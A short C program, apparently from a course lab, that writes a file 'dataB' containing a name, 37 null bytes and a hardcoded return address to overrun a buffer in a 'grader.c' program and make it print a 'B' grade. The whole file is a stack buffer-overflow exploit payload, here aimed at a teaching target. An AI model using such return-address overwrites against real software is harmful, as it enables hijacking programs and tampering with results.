/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* by Andy Nguyen and Icey Ai                                         */
/*--------------------------------------------------------------------*/
#include <stdio.h>

/*--------------------------------------------------------------------*/
/* creates and writes to a file named "dataB"                         */
/* does not take inputs                                               */
/* writes to file "dataB" using fprintf and fwrite                    */
/* "dataB" is used to perform a buffer overrun on the grader.c file   */
/*      to print out "B" as the grade.                                */
/*--------------------------------------------------------------------*/

int main(void) {

    int i;
    unsigned long addr;
    FILE *file;
    file = fopen("dataB", "w");

    /* Writes our names into the file */
    fprintf(file, "Andy & Icey");

    /* Write 37 null bytes until reaching the end of buf*/
    for (i = 0; i < 37; i++) {
        putc(0, file);
    }

    /* Write addr of where to return in the assembly code */
    addr = 0x400858;
    fwrite(&addr, sizeof(unsigned long), 1, file);

    /* Close the file and return 0 */
    fclose(file);
    return 0;
}

